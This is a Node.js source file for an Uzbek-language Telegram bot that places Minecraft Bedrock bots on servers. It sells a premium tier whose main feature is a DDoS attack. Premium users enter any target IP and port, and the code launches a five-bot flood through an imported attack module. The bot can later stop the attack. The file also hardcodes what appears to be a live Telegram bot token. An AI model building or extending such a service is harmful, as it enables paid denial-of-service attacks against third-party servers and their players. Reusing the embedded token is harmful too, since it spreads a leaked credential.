const TelegramBot = require('node-telegram-bot-api');
const { createMinecraftBot, checkUserLimit } = require('./qoshish.js');
const { initAdmin } = require('./admin.js');
const { DDoSAttack } = require('./ddos.js');
const { saveUser, getUserBots, removeBot, getSettings, isPremium, isAdmin } = require('./database.js');

const TELEGRAM_TOKEN = '8362458059:AAFW9YaKexmKqieZMlv8XPdWqHFS2sqM_AA';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const ADMIN_USERNAME = '@crpytouzb';

const userStates = new Map();
const ddosAttacks = new Map();

const mainKeyboard = {
  keyboard: [
    ['➕ Bot qoshish'],
    ['📋 Mening botim'],
    ['💎 Premium', 'ℹ️ Yordam']
  ],
  resize_keyboard: true
};

const premiumKeyboard = {
  keyboard: [
    ['➕ Bot qoshish'],
    ['📋 Botlarim'],
    ['💎 Premium holat', '⚡ DDoS boshlash'],
    ['🛑 DDoS to\'xtatish', '🏠 Bosh menyu']
  ],
  resize_keyboard: true
};

const cancelKeyboard = {
  keyboard: [['🚫 Bekor qilish']],
  resize_keyboard: true
};

const versionKeyboard = {
  keyboard: [
    ['1.21.50', '1.20.80'],
    ['1.19.83', 'Auto'],
    ['🚫 Bekor qilish']
  ],
  resize_keyboard: true,
  one_time_keyboard: true
};

// ================== START ==================

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? '@' + msg.from.username : msg.from.first_name;
  
  saveUser(userId, {
    username: username,
    firstName: msg.from.first_name,
    firstSeen: new Date().toISOString()
  });
  
  const isUserPremium = isPremium(userId);
  const settings = getSettings();
  
  if (isUserPremium) {
    bot.sendMessage(chatId, 
      `💎 PREMIUM\n\n` +
      `Salom ${username}!\n` +
      `Limit: ${settings.premiumLimit} ta bot\n` +
      `DDoS imkoniyati mavjud`,
      {
        reply_markup: premiumKeyboard
      }
    );
  } else {
    bot.sendMessage(chatId, 
      `Salom ${username}!\n\n` +
      `Oddiy foydalanuvchi: 1 ta bot\n` +
      `Premium: ${settings.premiumLimit} ta bot + DDoS\n\n` +
      `Bot qoshish uchun "➕ Bot qoshish" tugmasini bosing`,
      {
        reply_markup: mainKeyboard
      }
    );
  }
});

// ================== BOT QOSHISH ==================

bot.onText(/➕ Bot qoshish/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? '@' + msg.from.username : msg.from.first_name;
  
  const limitCheck = checkUserLimit(userId);
  const userBots = getUserBots(userId);
  const isUserPremium = isPremium(userId);
  const settings = getSettings();
  const userLimit = isUserPremium ? settings.premiumLimit : settings.regularLimit;
  
  // Agar userda bot bor bo'lsa, uni o'chirishni taklif qilish
  if (userBots.length > 0 && !isUserPremium) {
    const currentBot = userBots[0];
    
    const replaceKeyboard = {
      keyboard: [
        ['✅ Ha, o\'chirib yangisini qoshish'],
        ['❌ Yo\'q, bekor qilish']
      ],
      resize_keyboard: true,
      one_time_keyboard: true
    };
    
    return bot.sendMessage(chatId, 
      `ℹ️ Sizda allaqachon bot bor:\n` +
      `🤖 ${currentBot.botName}\n` +
      `🌐 ${currentBot.server}\n\n` +
      `Yangi bot qoshish uchun avvalgi bot o'chiriladi.\n` +
      `Davom ettirishni xohlaysizmi?`,
      {
        reply_markup: replaceKeyboard
      }
    ).then(() => {
      const listener = (response) => {
        if (response.chat.id === chatId && response.from.id === userId) {
          bot.removeListener('message', listener);
          
          if (response.text === '✅ Ha, o\'chirib yangisini qoshish') {
            // Eski botni o'chirish
            removeBot(currentBot.id);
            // Yangi bot qoshishni boshlash
            userStates.set(chatId, { 
              step: 'waiting_ip',
              userId: userId,
              username: username
            });
            
            bot.sendMessage(chatId, '🌐 Server IP kiriting:', {
              reply_markup: cancelKeyboard
            });
          } else {
            bot.sendMessage(chatId, '❌ Bekor qilindi.', {
              reply_markup: mainKeyboard
            });
          }
        }
      };
      
      bot.on('message', listener);
    });
  }
  
  // Premium userlar uchun oddiy limit tekshirish
  if (isUserPremium && !limitCheck.canAdd) {
    return bot.sendMessage(chatId, 
      `❌ Premium limit: ${limitCheck.current}/${settings.premiumLimit} ta\n` +
      `Yangi bot qoshish uchun avval ba'zi botlarni o'chiring.`,
      {
        reply_markup: premiumKeyboard
      }
    );
  }
  
  userStates.set(chatId, { 
    step: 'waiting_ip',
    userId: userId,
    username: username
  });
  
  bot.sendMessage(chatId, '🌐 Server IP kiriting:', {
    reply_markup: cancelKeyboard
  });
});

// ================== MESSAGE HANDLER ==================

bot.on('message', async (msg) => {
  try {
    const chatId = msg.chat.id;
    const text = msg.text;
    const userId = msg.from?.id;
    
    // Asosiy tekshirishlar
    if (!userId || !text || typeof text !== 'string') return;
    
    const state = userStates.get(chatId);
    
    // ===== BOT QOSHISH QADAMLARI =====
    if (state && !text.startsWith('/')) {
      if (state.step === 'waiting_ip') {
        userStates.set(chatId, {
          ...state,
          step: 'waiting_port',
          ip: text
        });
        
        bot.sendMessage(chatId, '🔢 Port (odatiy 19132):', {
          reply_markup: cancelKeyboard
        });
      }
      
      else if (state.step === 'waiting_port') {
        const port = parseInt(text) || 19132;
        userStates.set(chatId, {
          ...state,
          step: 'waiting_version',
          port: port
        });
        
        bot.sendMessage(chatId, '📦 Versiya tanlang:', {
          reply_markup: versionKeyboard
        });
      }
      
      else if (state.step === 'waiting_version') {
        const version = text;
        const { ip, port, userId, username } = state;
        
        bot.sendMessage(chatId, `🔄 Bot ulanmoqda...`);
        
        try {
          const serverData = { ip, port, version, userId, username };
          const result = await createMinecraftBot(serverData);
          
          const userBotsCount = getUserBots(userId).length;
          const isUserPremium = isPremium(userId);
          const settings = getSettings();
          const userLimit = isUserPremium ? settings.premiumLimit : settings.regularLimit;
          
          bot.sendMessage(chatId, 
            `✅ Bot qoshildi!\n\n` +
            `🤖 ${result.botName}\n` +
            `🌐 ${result.server}\n` +
            `📦 ${result.version}\n` +
            `📊 ${userBotsCount}/${userLimit} ta bot`,
            {
              reply_markup: isUserPremium ? premiumKeyboard : mainKeyboard
            }
          );
          
          userStates.delete(chatId);
          
        } catch (error) {
          bot.sendMessage(chatId, `❌ ${error.message}`, {
            reply_markup: isPremium(userId) ? premiumKeyboard : mainKeyboard
          });
          userStates.delete(chatId);
        }
      }
      
      // ===== DDoS QADAMLARI =====
      else if (state.step === 'ddos_ip') {
        userStates.set(chatId, {
          ...state,
          step: 'ddos_port',
          ddos_ip: text
        });
        
        bot.sendMessage(chatId, '🔢 DDoS uchun port kiriting:', {
          reply_markup: cancelKeyboard
        });
      }
      
      else if (state.step === 'ddos_port') {
        const port = parseInt(text) || 19132;
        userStates.set(chatId, {
          ...state,
          step: 'ddos_version',
          ddos_port: port
        });
        
        bot.sendMessage(chatId, '📦 DDoS uchun versiya tanlang:', {
          reply_markup: versionKeyboard
        });
      }
      
      else if (state.step === 'ddos_version') {
        const version = text;
        const ip = state.ddos_ip;
        const port = state.ddos_port;
        const userId = state.userId;
        
        if (!isPremium(userId)) {
          userStates.delete(chatId);
          return bot.sendMessage(chatId, '❌ Premium obuna kerak!');
        }
        
        if (!ddosAttacks.has(userId)) {
          ddosAttacks.set(userId, new DDoSAttack(userId));
        }
        
        const attack = ddosAttacks.get(userId);
        
        bot.sendMessage(chatId, `⚡ DDoS boshlanmoqda... (5 ta bot)`);
        
        try {
          const result = await attack.startAttack(ip, port, version, 5);
          
          bot.sendMessage(chatId, 
            `⚡ DDoS BOSHLANDI!\n\n` +
            `🌐 Target: ${ip}:${port}\n` +
            `🤖 Botlar: 5 ta\n` +
            `📦 Versiya: ${version}\n\n` +
            `To'xtatish uchun "🛑 DDoS to'xtatish"`,
            {
              reply_markup: premiumKeyboard
            }
          );
          
        } catch (error) {
          bot.sendMessage(chatId, `❌ ${error.message}`, {
            reply_markup: premiumKeyboard
          });
        }
        
        userStates.delete(chatId);
      }
    }
    
    // ===== QAYTA QOSHISH =====
    else if (text.startsWith('🔄 ')) {
      const botName = text.replace('🔄 ', '');
      const userBots = getUserBots(userId);
      const isUserPremium = isPremium(userId);
      
      const selectedBot = userBots.find(bot => bot.botName === botName);
      
      if (!selectedBot) {
        return bot.sendMessage(chatId, '❌ Bot topilmadi.', {
          reply_markup: isUserPremium ? premiumKeyboard : mainKeyboard
        });
      }
      
      // Oddiy foydalanuvchi uchun: eski botni o'chirib, yangisini qoshish
      if (!isUserPremium) {
        // Eski botni o'chirish
        removeBot(selectedBot.id);
        
        // Server ma'lumotlarini olish
        const [ip, port] = selectedBot.server.split(':');
        const version = selectedBot.version;
        const username = selectedBot.username;
        
        bot.sendMessage(chatId, `🔄 Yangi bot qoshilmoqda: ${selectedBot.server}`);
        
        try {
          const serverData = { 
            ip, 
            port: parseInt(port), 
            version, 
            userId, 
            username 
          };
          
          const result = await createMinecraftBot(serverData);
          
          bot.sendMessage(chatId, 
            `✅ Yangi bot qoshildi!\n\n` +
            `🤖 ${result.botName}\n` +
            `🌐 ${result.server}\n` +
            `📦 ${result.version}`,
            {
              reply_markup: mainKeyboard
            }
          );
          
        } catch (error) {
          bot.sendMessage(chatId, 
            `❌ Qayta qoshishda xato:\n${error.message}`,
            {
              reply_markup: mainKeyboard
            }
          );
        }
      } 
      // Premium foydalanuvchi uchun: faqat qayta qoshish
      else {
        const settings = getSettings();
        const userBotsCount = getUserBots(userId).length;
        
        // Limit tekshirish (faqat premium uchun)
        if (userBotsCount >= settings.premiumLimit) {
          return bot.sendMessage(chatId, 
            `❌ Premium limit: ${userBotsCount}/${settings.premiumLimit} ta\n` +
            `Yangi bot qoshish uchun avval ba'zi botlarni o'chiring.`,
            {
              reply_markup: premiumKeyboard
            }
          );
        }
        
        // Server ma'lumotlarini olish
        const [ip, port] = selectedBot.server.split(':');
        const version = selectedBot.version;
        const username = selectedBot.username;
        
        bot.sendMessage(chatId, `🔄 Bot qayta qoshilmoqda: ${selectedBot.server}`);
        
        try {
          const serverData = { 
            ip, 
            port: parseInt(port), 
            version, 
            userId, 
            username 
          };
          
          const result = await createMinecraftBot(serverData);
          
          const newCount = getUserBots(userId).length;
          
          bot.sendMessage(chatId, 
            `✅ Yangi bot qoshildi!\n\n` +
            `🤖 ${result.botName}\n` +
            `🌐 ${result.server}\n` +
            `📦 ${result.version}\n` +
            `📊 ${newCount}/${settings.premiumLimit} ta bot`,
            {
              reply_markup: premiumKeyboard
            }
          );
          
        } catch (error) {
          bot.sendMessage(chatId, 
            `❌ Qayta qoshishda xato:\n${error.message}`,
            {
              reply_markup: premiumKeyboard
            }
          );
        }
      }
    }
    
    // ===== BOT O'CHIRISH (PREMIUM) =====
    else if (text.startsWith('🗑️ ')) {
      const isUserPremium = isPremium(userId);
      
      if (!isUserPremium) {
        return bot.sendMessage(chatId, '❌ Bot o\'chirish faqat Premium uchun!', {
          reply_markup: mainKeyboard
        });
      }
      
      const botName = text.replace('🗑️ ', '');
      const userBots = getUserBots(userId);
      
      const botToRemove = userBots.find(bot => bot.botName === botName);
      
      if (botToRemove && removeBot(botToRemove.id)) {
        const settings = getSettings();
        const remainingBots = getUserBots(userId).length;
        
        bot.sendMessage(chatId, 
          `✅ "${botName}" ochirildi.\n` +
          `📊 Qolgan botlar: ${remainingBots}/${settings.premiumLimit} ta`,
          {
            reply_markup: premiumKeyboard
          }
        );
      }
    }
    
  } catch (error) {
    console.error('Message handler xatosi:', error);
  }
});

// ================== BOTLARIM ==================

bot.onText(/📋 Mening botim|📋 Botlarim/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? '@' + msg.from.username : msg.from.first_name;
  
  const userBots = getUserBots(userId);
  const isUserPremium = isPremium(userId);
  const settings = getSettings();
  const userLimit = isUserPremium ? settings.premiumLimit : settings.regularLimit;
  
  if (userBots.length === 0) {
    return bot.sendMessage(chatId, 
      `${username}, sizda hozircha bot yo'q.\n` +
      `Bot qoshish uchun "➕ Bot qoshish" tugmasini bosing.`,
      {
        reply_markup: isUserPremium ? premiumKeyboard : mainKeyboard
      }
    );
  }
  
  let message = `📋 Botlaringiz (${userBots.length}/${userLimit}):\n\n`;
  
  // Botlar uchun keyboard yaratish
  const botKeyboard = {
    keyboard: [],
    resize_keyboard: true
  };
  
  userBots.forEach((bot, index) => {
    const timeAgo = Math.floor((new Date() - new Date(bot.createdAt)) / 60000);
    const hours = Math.floor(timeAgo / 60);
    const minutes = timeAgo % 60;
    
    message += `${index + 1}. ${bot.botName}\n`;
    message += `   🌐 ${bot.server}\n`;
    message += `   📦 ${bot.version}\n`;
    
    if (hours > 0) {
      message += `   ⏰ ${hours} soat ${minutes} daqiqa\n\n`;
    } else {
      message += `   ⏰ ${minutes} daqiqa\n\n`;
    }
    
    // Har bir bot uchun 2 ta amal
    if (isUserPremium) {
      // Premium: o'chirish va qayta qoshish
      botKeyboard.keyboard.push([
        `🔄 ${bot.botName}`,
        `🗑️ ${bot.botName}`
      ]);
    } else {
      // Oddiy: faqat qayta qoshish (o'chirib yangisini)
      botKeyboard.keyboard.push([`🔄 ${bot.botName}`]);
    }
  });
  
  if (isUserPremium) {
    message += `🔄 - Qayta qoshish\n🗑️ - Botni o'chirish`;
  } else {
    message += `🔄 - O'chirib yangi bot qoshish`;
  }
  
  // Orqaga qaytish tugmasi
  botKeyboard.keyboard.push(['🏠 Bosh menyu']);
  
  bot.sendMessage(chatId, message, {
    reply_markup: botKeyboard
  });
});

// ================== DDoS BOSHLASH ==================

bot.onText(/⚡ DDoS boshlash/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isPremium(userId)) {
    return bot.sendMessage(chatId, 
      `❌ DDoS faqat Premium uchun!\n` +
      `Premium sotib olish: ${ADMIN_USERNAME}`,
      {
        reply_markup: mainKeyboard
      }
    );
  }
  
  userStates.set(chatId, {
    step: 'ddos_ip',
    userId: userId
  });
  
  bot.sendMessage(chatId, '🌐 DDoS uchun server IP kiriting:', {
    reply_markup: cancelKeyboard
  });
});

// ================== DDoS TO'XTATISH ==================

bot.onText(/🛑 DDoS to\'xtatish/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isPremium(userId)) {
    return bot.sendMessage(chatId, '❌ Premium obuna kerak!', {
      reply_markup: mainKeyboard
    });
  }
  
  const attack = ddosAttacks.get(userId);
  
  if (!attack) {
    return bot.sendMessage(chatId, '❌ Faol DDoS hujum yo\'q', {
      reply_markup: premiumKeyboard
    });
  }
  
  const activeBots = attack.getActiveAttackCount();
  
  if (activeBots === 0) {
    return bot.sendMessage(chatId, '❌ Faol DDoS hujum yo\'q', {
      reply_markup: premiumKeyboard
    });
  }
  
  const result = attack.stopAllAttacks();
  
  bot.sendMessage(chatId, 
    `✅ DDoS TO'XTATILDI\n\n` +
    `🛑 ${result.stoppedBots} ta bot o'chirildi`,
    {
      reply_markup: premiumKeyboard
    }
  );
});

// ================== PREMIUM ==================

bot.onText(/💎 Premium|💎 Premium holat/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const settings = getSettings();
  
  if (isPremium(userId)) {
    const userBots = getUserBots(userId);
    
    return bot.sendMessage(chatId, 
      `💎 SIZ PREMIUM OBUNACHISIZ!\n\n` +
      `Limit: ${settings.premiumLimit} ta bot\n` +
      `DDoS imkoniyati mavjud\n` +
      `Joriy botlar: ${userBots.length} ta`,
      {
        reply_markup: premiumKeyboard
      }
    );
  }
  
  bot.sendMessage(chatId, 
    `💎 PREMIUM OBUNA\n\n` +
    `Narxi: ${settings.premiumPrice} so'm\n` +
    `Limit: ${settings.premiumLimit} ta bot\n` +
    `DDoS imkoniyati (5 ta bot)\n` +
    `Bot o'chirish imkoniyati\n\n` +
    `Sotib olish uchun: ${ADMIN_USERNAME}`,
    {
      reply_markup: mainKeyboard
    }
  );
});

// ================== YORDAM ==================

bot.onText(/ℹ️ Yordam/, (msg) => {
  const chatId = msg.chat.id;
  
  bot.sendMessage(chatId, 
    `ℹ️ YORDAM\n\n` +
    `📌 *Oddiy foydalanuvchi:*\n` +
    `• 3 ta bot\n` +
    `• Qayta qoshish (eski bot o'chiriladi)\n\n` +
    `💎 *Premium foydalanuvchi:*\n` +
    `• ${getSettings().premiumLimit} ta bot\n` +
    `• Bot o'chirish\n` +
    `• DDoS hujum (5 bot)\n\n` +
    `🔧 *Qo'llanma:*\n` +
    `1. IP: play.example.com\n` +
    `2. Port: 19132\n` +
    `3. Versiya: 1.21.50\n` +
    `4. Admin: ${ADMIN_USERNAME}`,
    {
      parse_mode: 'Markdown',
      reply_markup: mainKeyboard
    }
  );
});

// ================== BEKOR QILISH ==================

bot.onText(/🚫 Bekor qilish/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  userStates.delete(chatId);
  bot.sendMessage(chatId, '❌ Bekor qilindi.', {
    reply_markup: isPremium(userId) ? premiumKeyboard : mainKeyboard
  });
});

// ================== BOSH MENYU ==================

bot.onText(/🏠 Bosh menyu/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  userStates.delete(chatId);
  bot.sendMessage(chatId, '🏠 Bosh menyu:', {
    reply_markup: isPremium(userId) ? premiumKeyboard : mainKeyboard
  });
});

// ================== ADMIN PANEL ==================

initAdmin(bot);

// ================== XATOLIKLAR ==================

bot.on('polling_error', (error) => {
  console.error('Polling error:', error);
});

console.log('🤖 Bot ishga tushdi...');
